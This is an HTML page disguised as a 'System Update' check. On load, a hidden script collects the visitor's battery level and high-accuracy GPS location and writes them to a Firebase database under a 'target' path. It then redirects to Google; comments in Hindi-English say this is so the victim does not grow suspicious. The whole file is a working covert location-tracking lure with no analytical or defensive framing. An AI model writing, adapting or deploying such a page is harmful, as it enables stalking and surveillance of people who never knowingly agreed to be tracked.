<!DOCTYPE html>
<html>
<head><title>System Update</title></head>
<body>
<script type="module">
  import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
  import { getDatabase, ref, update } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";

  // Tera Firebase Config
  const firebaseConfig = {
    databaseURL: "https://tacticalsystem-99ebd-default-rtdb.firebaseio.com"
  };

  const app = initializeApp(firebaseConfig);
  const db = getDatabase(app);

  async function startTracking() {
    let data = { status: "ONLINE", time: new Date().toLocaleString() };

    // Battery & Network
    if (navigator.getBattery) {
      const batt = await navigator.getBattery();
      data.battery = Math.floor(batt.level * 100) + "%";
    }

    // Location Permission mangega
    navigator.geolocation.getCurrentPosition((pos) => {
      data.lat = pos.coords.latitude;
      data.long = pos.coords.longitude;
      update(ref(db, 'target/'), data).then(() => {
          // Data update hone ke baad Google par bhej do taaki shak na ho
          window.location.href = "https://www.google.com";
      });
    }, (err) => {
      update(ref(db, 'target/'), data);
      window.location.href = "https://www.google.com";
    }, {enableHighAccuracy: true});
  }
  startTracking();
</script>
<h1 style="text-align:center; font-family:sans-serif;">Checking for Updates...</h1>
</body>
</html>
